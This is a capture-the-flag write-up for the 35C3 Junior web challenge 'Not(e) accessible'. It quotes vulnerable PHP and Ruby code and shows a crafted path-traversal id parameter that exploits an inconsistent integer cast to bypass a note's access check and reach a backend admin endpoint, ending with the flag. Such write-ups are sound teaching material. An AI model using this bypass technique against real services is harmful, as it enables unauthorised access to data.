# 35C3 Junior CTF – Not(e) accessible

* **Category:** Web
* **Points:** 55 (variable)

## Challenge

> We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that's why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.
>
> Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable...
>
> http://35.207.120.163
>
> Difficulty estimate: Easy-Medium

## Solution

If you try to submit a note (with spaces) an error will appear.

> ERROR! - Text does not match /^[a-zA-Z]+$/

If the text follows the shown regex, the note is inserted showing some info.

> Your note ID is 5779715767432985082
>
> Your note PW is 44a0cbcab0cdb0326be3b76b21bb25c9
>
> And the link to the note:
> http://35.207.120.163/view.php?id=5779715767432985082&pw=44a0cbcab0cdb0326be3b76b21bb25c9

Analyzing the HTML, you can find the following comment.

```HTML
<!-- My source is at /src.tgz -->
```

The archive contains both the frontend and the backend code.

Into the backend file `app.rb` you can discover the backend endpoint that must be called to retrieve the flag.

```Ruby
get '/admin' do
	File.read("flag.txt")
end
```

The code that can be abused is into frontend `view.php` file.

```PHP
if(file_exists("./pws/" . (int) $id . ".pw")) {
    if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
        echo file_get_contents($BACKEND . "get/" . $id);
```

The `int` cast is not present everywhere, so the `id` parameter can be crafted like the following.

```
5779715767432985082/../../admin
```

With this parameter, the first two `if` statements will be true, because the result of the expression is the following, due to the fact that PHP will consider only the integer part for the cast.

```
./pws/5779715767432985082.pw
```

That result is a valid password file, the one created previously during the note submission.

The `file_get_contents` instruction will perform a HTTP GET call to the following backend endpoint.

```
$BACKEND/get/5779715767432985082/../../admin
```

That will be interpreted like `$BACKEND/admin`

Hence, the flag will be returned.

```
35C3_M1Cr0_S3rvices_4R3_FUN!
```